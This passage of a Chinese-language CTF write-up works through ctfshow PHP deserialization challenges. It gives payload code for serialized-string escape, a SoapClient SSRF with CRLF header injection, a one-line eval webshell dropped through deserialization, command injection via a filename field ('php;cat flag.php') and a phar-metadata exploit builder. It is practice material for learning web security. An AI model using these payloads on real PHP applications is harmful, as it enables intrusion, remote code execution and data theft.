class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = unserialize(base64_decode(<span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考资料：</p><p><a href="https://blog.csdn.net/qq_43431158/article/details/108210822">https://blog.csdn.net/qq_43431158/article/details/108210822</a>（Web262）</p><p><a href="https://blog.csdn.net/qq_45521281/article/details/107135706">https://blog.csdn.net/qq_45521281/article/details/107135706</a>（两种序列化）</p><p>这里利用到了反序列化的逃逸，就是前面有一个看不懂的莫名其妙的将fuck替换为loveU的过程，这里就可以派上用场了。</p><p>因为将fuck替换为loveU其实是增加了字符串的长度。而反序列化中其中有一个字段是用来说明字符串的字符个数的，导致传进去的字符串被替换后刚刚好在<code>&quot;;</code>前被截断了。只要字符个数会有多出来，然后成功把后面的括号给包含与闭合，任务就算完成了。</p><p>由题目，我们的任务是将其token替换为admin，也就是只要后面这一段，要在$t上下手。</p><p><code>&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code></p><p>这里一共新增27个字符，所以我们要写27个fuck。</p><p>拼接后参数t为</p><p><code>fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code></p><p>参数f和参数m随意设置，最后请求参数为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">f:<span class="number">1</span></span><br><span class="line">m:<span class="number">1</span></span><br><span class="line">t:fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck%<span class="number">22</span>;s:<span class="number">5</span>:%<span class="number">22</span>token%<span class="number">22</span>;s:<span class="number">5</span>:%<span class="number">22</span>admin%<span class="number">22</span>;&#125;</span><br></pre></td></tr></table></figure><p>访问index.php出现 <code>Your message has been sent</code> 后新增cookies msg，内容随便设置，访问message.php，获得flag</p><p>真是好累啊（擦汗）</p><p>同样的，对于反序列化字符长度减小，我们也可以更换思路，将原有的字符串顶包补足给前一个参数，然后我们再在后面添加修改。</p><p>比如这题，如果替换了一下，变成将loveU换成fuck那该怎么做呢？</p><p>我们同样可以选择修改t参数，让他把原来的后面的参数给吃了。原来的参数序列化后为 <code>&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;</code>，那我们就写26个loveU，让他把后面吃了，我们自己再补充 <code>&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code> ，就可以解决字符串减小的反序列化漏洞。</p><h1 id="web265"><a href="#web265" class="headerlink" title="web265"></a>web265</h1><h2 id="知识点-7"><a href="#知识点-7" class="headerlink" title="知识点"></a>知识点</h2><ul><li>对象内变量指针</li></ul><h2 id="做法-8"><a href="#做法-8" class="headerlink" title="做法"></a>做法</h2><p>从代码可以看出来，这里的token是被替换过的，所以从token下手是没办法的。但是可以看到login处又有判断要求token和password相同，那有什么办法呢？</p><p>C语言里面讲过一个指针的思想，PHP上其实也可以应用，也可以被序列化，所以我们将password的值始终绑定到token上就可以了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span>; <span class="comment">// 对password动手</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> ctfshowAdmin();</span><br><span class="line">    <span class="variable">$a</span>-&gt;password = &amp;<span class="variable">$a</span>-&gt;token;</span><br><span class="line">    <span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出 <code>O:12:&quot;ctfshowAdmin&quot;:2:&#123;s:5:&quot;token&quot;;N;s:8:&quot;password&quot;;R:2;&#125;</code> ，丢到参数里拿到flag</p><h1 id="web266"><a href="#web266" class="headerlink" title="web266"></a>web266</h1><h2 id="知识点-8"><a href="#知识点-8" class="headerlink" title="知识点"></a>知识点</h2><ul><li>正则表达式</li><li>PHP 函数/类命名不区分大小写</li></ul><h2 id="做法-9"><a href="#做法-9" class="headerlink" title="做法"></a>做法</h2><p>这题中可以看出，最后三行明显是不让你碰ctfshow这几个字，但题中的class偏偏是ctfshow，怎么办呢？</p><p>行吧，这题就是考php基础，千算万算没算到PHP的函数是不区分大小写的。</p><p>（以后可以留意正则最后面有没有加/i，没加就是不区分大小写）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> ctfshow());</span><br></pre></td></tr></table></figure><p>输出 <code>O:7:&quot;ctfshow&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;xxxxxx&quot;;s:8:&quot;password&quot;;s:6:&quot;xxxxxx&quot;;&#125;</code></p><p>将ctfshow任意一个字母改为大写，成功拿flag</p><p>绝！</p><h1 id="web259"><a href="#web259" class="headerlink" title="web259"></a>web259</h1><p><code>本题目基于 PHP7.3.11</code></p><h2 id="知识点-9"><a href="#知识点-9" class="headerlink" title="知识点"></a>知识点</h2><ul><li><a href="https://www.php.net/manual/en/class.soapclient.php">SoapClient</a>，在反序列化时利用PHP原生类</li><li>CRLF漏洞，即利用回车+换行（\r\n）注入到Header中</li></ul><h2 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h2><p>看flag.php的条件，首先要修改请求头XFF，使用ModHeader可以修改。同时要带上ctfshow的token，方可获得flag.txt。但看似简单，实际上直接请求flag.php就算作弊了，题目要求的应该是通过index.php来请求flag.php。</p><p>虽然但是，不知道index.php想干嘛，题目提示了个flag.php，其实也跟index.php没啥关系嘛</p><p>改header xff为127.0.0.1，同时post个token为ctfshow，成功。</p><h2 id="官方の梦"><a href="#官方の梦" class="headerlink" title="官方の梦"></a>官方の梦</h2><p>参考地址：</p><p><a href="https://blog.csdn.net/rfrder/article/details/113808539">https://blog.csdn.net/rfrder/article/details/113808539</a></p><p><a href="http://cn-sec.com/archives/145718.html">http://cn-sec.com/archives/145718.html</a></p><p><del>上面那个解都不知道哪个傻子做的，还以为做1+1=2呢</del></p><p>从 index.php 可以看出，该题打算在 index.php 中通过反序列化调用 flag.php 中的类，但题目中并没有明确地调用到flag.php。所以显然上述解法是错误的。SoapClient 是内置在 PHP 当中，可以直接被调用的一个类。</p><p>同时，利用请求头的CRLF漏洞，对请求头的 Content-Length 进行覆盖，使其读完请求头后忽略后续数据与请求头。参考资料如下：</p><p><a href="https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html">https://wooyun.js.org/drops/CRLF Injection漏洞的利用与实例分析.html</a></p><p>目前题目的目的就是要实例化 SoapClient，并对 <a href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a> 发出post请求。多次尝试后，发现正常进行一个POST请求必须带上下面的参数，且缺一不可：</p><ul><li>请求方式，请求路径，HTTP版本</li><li>Host主机</li><li>Content-Type 内容类型</li><li>Content-Length 内容长度（用于截断后续请求）</li><li>同时，对于本题目，还需要补充 XFF。</li></ul><p>在telnet中尝试此操作</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">telnet aaa.challenge.ctf.show <span class="number">8080</span></span><br><span class="line">Trying <span class="number">1.116</span>.<span class="number">34.181</span>...</span><br><span class="line">Connected to aaa.challenge.ctf.show.</span><br><span class="line">Escape character is <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line"></span><br><span class="line">POST /flag.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">4</span>dfd222c-c826-<span class="number">43e9</span>-bcd9-<span class="number">5</span>b2afef3dd68.challenge.ctf.show:<span class="number">8080</span></span><br><span class="line">X-Forwarded-<span class="keyword">For</span>: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">13</span></span><br><span class="line"></span><br><span class="line">token=ctfshow</span><br><span class="line"></span><br><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Content-Type: text/html; charset=UTF-<span class="number">8</span></span><br><span class="line">Date: Mon, <span class="number">09</span> Aug <span class="number">2021</span> <span class="number">23</span>:<span class="number">16</span>:<span class="number">58</span> GMT</span><br><span class="line">Server: nginx/<span class="number">1.16</span>.<span class="number">1</span></span><br><span class="line">X-Powered-By: PHP/<span class="number">7.3</span>.<span class="number">11</span></span><br><span class="line">Content-Length: <span class="number">0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以发现返回的Content-Length为0，则成功放置flag.php。</p><p>同样的，在SoapClient中，我们要对Header进行下手，构造类似的头。为了区分头部和post内容，在头部和内容间应多一次回车换行。但SoapClient仅可修改User-Agent，所以我们要从User-Agent下手，修改后的User-Agent为</p><p><code>ThisIsKellysBrowser\r\nX-Forwarded-For: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 13\r\n\r\ntoken=ctfshow</code></p><p>我们尝试对其他IP发送一次Post请求并抓包，看看到底发生了什么</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// web259.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$request</span> = <span class="keyword">new</span> SoapClient(</span><br><span class="line">        <span class="literal">null</span>,</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&quot;ThisIsKellysBrowser\r\nX-Forwarded-For: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 13\r\n\r\ntoken=ctfshow&quot;</span>,</span><br><span class="line">                <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;useless&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://172.16.*.*/flag.php&#x27;</span></span><br><span class="line">            )</span><br><span class="line">    );</span><br><span class="line">    <span class="variable">$request</span>-&gt;getFlag();</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$request</span>));</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Internet Protocol Version <span class="number">4</span>, Src: <span class="number">172.16</span>.*.*, Dst: <span class="number">172.16</span>.*.*</span><br><span class="line">Transmission Control Protocol, Src Port: <span class="number">58943</span>, Dst Port: <span class="number">80</span>, Seq: <span class="number">1</span>, Ack: <span class="number">1</span>, Len: <span class="number">681</span></span><br><span class="line">Hypertext Transfer Protocol</span><br><span class="line">    POST /flag.php HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">    Host: <span class="number">172.16</span>.*.*\r\n</span><br><span class="line">    Connection: Keep-Alive\r\n</span><br><span class="line">    User-Agent: ThisIsKellysBrowser\r\n</span><br><span class="line">    X-Forwarded-<span class="keyword">For</span>: <span class="number">127.0</span>.<span class="number">0.1</span>\r\n</span><br><span class="line">    Content-Type: application/x-www-form-urlencoded\r\n</span><br><span class="line">    Content-Length: <span class="number">13</span>\r\n</span><br><span class="line">    \r\n</span><br><span class="line">    [Full request URI: http:<span class="comment">//172.16.*.*/flag.php]</span></span><br><span class="line">    [HTTP request <span class="number">1</span>/<span class="number">1</span>]</span><br><span class="line">    File Data: <span class="number">13</span> bytes</span><br><span class="line">HTML Form URL Encoded: application/x-www-form-urlencoded</span><br><span class="line">    Form item: <span class="string">&quot;token&quot;</span> = <span class="string">&quot;ctfshow&quot;</span></span><br><span class="line">        Key: token</span><br><span class="line">        Value: ctfshow</span><br><span class="line">Hypertext Transfer Protocol</span><br><span class="line">    Leading CRLF previous message in the stream may have extra CRLF</span><br><span class="line">    Content-Type: text/xml; charset=utf-<span class="number">8</span>\r\n</span><br><span class="line">    SOAPAction: <span class="string">&quot;useless#getFlag&quot;</span>\r\n</span><br><span class="line">    Content-Length: <span class="number">374</span>\r\n</span><br><span class="line">    \r\n</span><br><span class="line">    File Data: <span class="number">374</span> bytes</span><br><span class="line">eXtensible Markup Language</span><br><span class="line">Hypertext Transfer Protocol</span><br><span class="line">    File Data: <span class="number">2</span> bytes</span><br><span class="line">    Data (<span class="number">2</span> bytes)</span><br></pre></td></tr></table></figure><p>可以看到，这位wireshark同学对我们刚发出的请求十分疑惑，理论上来说发出token=ctfshow以后客户端方面就该闭嘴了，没想到他还在啪啪啪地发着他的头，他想干啥呢，事实上在服务端接收的时候，也是接收完token=ctfshow后就不理你了，服务端会正常接收请求并返回内容，往后的内容会当成下一次的请求处理。</p><p>同时，毫无用处的uri也会在下方的SOAPAction中体现。不过我们的输入到token=ctfshow就结束了，所以后面的是真的没什么用。Host和路径会由SoapClient自动帮我们解析。</p><p>但是请求过程中发现了一个问题，如果请求头中xff没有设置为 <code>X-Forwarded-For: 127.0.0.1, 127.0.0.1</code> ，则会抛出错误</p><p><code>Fatal error: Uncaught SoapFault exception: [Client] looks like we got no XML document in /var/www/html/index.php:8 Stack trace: #0 /var/www/html/index.php(8): SoapClient-&gt;__call(&#39;getFlag&#39;, Array) #1 &#123;main&#125; thrown in /var/www/html/index.php on line 8</code></p><p>原因：在flag.php中，有一句不起眼的 <code>$ip = array_pop($xff)</code> ，会将第一个XFF IP去掉，导致 flag.php 没法拿到ip，真是太可恨了（握拳</p><p>所以，最终的payload应为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// web259.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$request</span> = <span class="keyword">new</span> SoapClient(</span><br><span class="line">        <span class="literal">null</span>,</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&quot;ThisIsKellysBrowser\r\nX-Forwarded-For: 127.0.0.1,127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 13\r\n\r\ntoken=ctfshow&quot;</span>,</span><br><span class="line">                <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;useless&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span></span><br><span class="line">            )</span><br><span class="line">    );</span><br><span class="line">    <span class="variable">$request</span>-&gt;getFlag();</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$request</span>));</span><br></pre></td></tr></table></figure><p>然后访问 /flag.txt ，获取flag。</p><h2 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h2><h3 id="HTTP的请求过程"><a href="#HTTP的请求过程" class="headerlink" title="HTTP的请求过程"></a>HTTP的请求过程</h3><p>首先用 telnet 建立一个socket连接进行尝试，我们这里尝试一个最简单的请求，就拿我刚才写的payload做例子吧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">telnet localhost <span class="number">8888</span></span><br><span class="line">Trying ::<span class="number">1</span>...</span><br><span class="line">Connected to localhost.</span><br><span class="line">Escape character is <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line"></span><br><span class="line">GET /web262.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: ctfshow.local:<span class="number">8888</span></span><br><span class="line"></span><br><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Date: Mon, <span class="number">09</span> Aug <span class="number">2021</span> <span class="number">15</span>:<span class="number">06</span>:<span class="number">21</span> GMT</span><br><span class="line">Server: Apache</span><br><span class="line">X-Powered-By: PHP/<span class="number">7.4</span>.<span class="number">2</span></span><br><span class="line">Content-Length: <span class="number">128</span></span><br><span class="line">Content-Type: text/html; charset=UTF-<span class="number">8</span></span><br><span class="line"></span><br><span class="line">Tzo3OiJtZ...</span><br></pre></td></tr></table></figure><p>可以看到，我们这里对 web262.php 进行 GET 请求只发送了两行，下面服务端就返回了完整的头部和内容。实际上，对于任何一个请求，客户端发送都必须要有这两行的要素。一，包括其请求方式、路径、http协议版本，二、请求的主机名。在没有curl而有telnet的情况下，大可以用这种方式来测试中间件服务器是否正常运作（不过一般不会有人这么干，也很少有只有telnet而没有curl的情况）</p><h2 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h2><ul><li><p>除了 SoapClient，有没有其他也能够被调用网页请求的类呢？</p><p>  &lt;待补充&gt;</p></li><li><p>是否存在任何反序列化的文件都可以调用 SoapClient 达到对内网其他网站的请求或攻击？</p><p>  理论上存在反序列化的地方都可以调用 SoapClient，前提是他能够调用一个不存在的方法。</p></li><li><p>为什么在 SoapClient 的变量中请求 getFlag 就能发起一次请求呢？</p><p>  答：SoapClient 在调用不存在的方法的时候，会让SoapClient直接调用__call</p></li><li><p>为什么必须要设置 uri 和 location？我不设置可以吗</p><p>  An array of options. If working in WSDL mode, this parameter is optional. If working in non-WSDL mode, you must set the location  and uri options, where location is the URL to request and uri is the target namespace of the SOAP service.<br>  ————————————————<br>  版权声明：本文为CSDN博主「gogiqp_jyh」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>  原文链接：<a href="https://blog.csdn.net/gogiqp_jyh/article/details/17359053">https://blog.csdn.net/gogiqp_jyh/article/details/17359053</a></p><p>  即工作于非WSDL模式下的时候，uri和location必须设置，uri为SOAP服务的目标命名空间，但实际上在本题并没有什么卵用，大可忽略。</p></li></ul><h1 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h1><p><code>本题目基于 PHP7.4.16</code></p><p>参考资料：<a href="https://blog.csdn.net/miuzzx/article/details/110558192">https://blog.csdn.net/miuzzx/article/details/110558192</a></p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>根据上述题解中所述，</p><p>如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法，</p><p>则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。</p><p>所以在该题中，只有unserialize()会被激活。事实上随意构造一个payload尝试一下也是如此，仅仅调用了unserialize和destruct</p><p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%207.png" alt="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%207.png"></p><p>同时还有一个关键，要在desturct时判断其code为0x36d（十进制为877）方可执行file_put_contents。留意一个条件，PHP在双等号时为弱类型判断。我们可以简单构造一个判断语句进行尝试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="number">877</span> == <span class="string">&quot;877jro2i3rio235oi2toin23iotnoi&quot;</span>; <span class="comment">// 1</span></span><br></pre></td></tr></table></figure><p>PHP 返回结果为 1，那就好办了，只需要将 username 设为 877.php，password设为一句话木马即可。</p><h2 id="做法-10"><a href="#做法-10" class="headerlink" title="做法"></a>做法</h2><p>最后的payload为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> ctfshowvip();</span><br><span class="line">    <span class="variable">$a</span>-&gt;username = <span class="string">&quot;877.php&quot;</span>;</span><br><span class="line">    <span class="variable">$a</span>-&gt;password = <span class="string">&quot;&lt;?php&quot;</span> . <span class="string">&#x27; eval($_POST[0]); ?&gt;&#x27;</span>;;</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>然后在 AntSword 中进入 /flag_is_here 获取 flag。</p><h1 id="web275"><a href="#web275" class="headerlink" title="web275"></a>web275</h1><p><code>本题目基于 PHP7.3.11</code></p><p>俗话说得好，最evil的才是最骚的（不是</p><p>留意下列条件，卧槽evil反而能利用system？我还以为是利用file_put_contents来做，但很明显这里有更方便的方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;evilfile)&#123;</span><br><span class="line">            system(<span class="string">&#x27;rm &#x27;</span>.<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>构造fn参数为 <code>php;ls</code> 可以看到当前目录下有两个文件<code>flag.php index.php</code></p><p>构造fn参数为 <code>php;cat flag.php</code> 获取flag</p><h1 id="web276"><a href="#web276" class="headerlink" title="web276"></a>web276</h1><p><code>本题目基于 PHP7.3.11</code></p><p>参考资料：<a href="https://blog.csdn.net/weixin_45882317/article/details/116225803">https://blog.csdn.net/weixin_45882317/article/details/116225803</a></p><p>这里判断条件被<code>$this→admin</code>堵死了，看起来并没有其他途径来修改admin的值。</p><h2 id="知识点-10"><a href="#知识点-10" class="headerlink" title="知识点"></a>知识点</h2><ul><li>phar 的打包和使用<ul><li><a href="https://cloud.tencent.com/developer/article/1555484">https://cloud.tencent.com/developer/article/1555484</a></li><li><a href="https://www.iloveflag.com/2020/07/09/%E6%B5%85%E8%B0%88phar%E6%96%87%E4%BB%B6%E5%9C%A8ctf%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/">https://www.iloveflag.com/2020/07/09/浅谈phar文件在ctf中的应用/</a></li><li><a href="https://zhuanlan.zhihu.com/p/385362368">https://zhuanlan.zhihu.com/p/385362368</a></li></ul></li></ul><h2 id="关键"><a href="#关键" class="headerlink" title="关键"></a>关键</h2><ul><li>file_put_contents 中可以输入绝对路径，unlink 中也会丢出一个绝对路径，绝对路径和绝对路径拼接会导致unlink失败。</li></ul><h2 id="做法-11"><a href="#做法-11" class="headerlink" title="做法"></a>做法</h2><p>phar其实类似于jar一样，将一大堆的php代码打包封装好直接调用。</p><p>首先，打包要将 phar.readonly 设置为 Off，否则会出现如下报错</p><p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%208.png" alt="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%208.png"></p><p>将fn设成 <code>/var/www/html/233.txt</code> ，底下报出 <code>Warning: unlink(/var/www/html//var/www/html/233.txt): No such file or directory in /var/www/html/index.php on line 49</code> ，再访问233.txt，返回200，手术很成功.jpg</p><p>首先尝试一下列出目录，payload如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">filter</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&quot;;ls;&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$filecontent</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$evilfile</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$admin</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> filter();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.php&quot;</span>, <span class="string">&quot;Powered By Genshin Impact&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;stopBuffering();    <span class="comment">//签名自动计算</span></span><br></pre></td></tr></table></figure><p>在自己电脑上运行一下，会生成一个 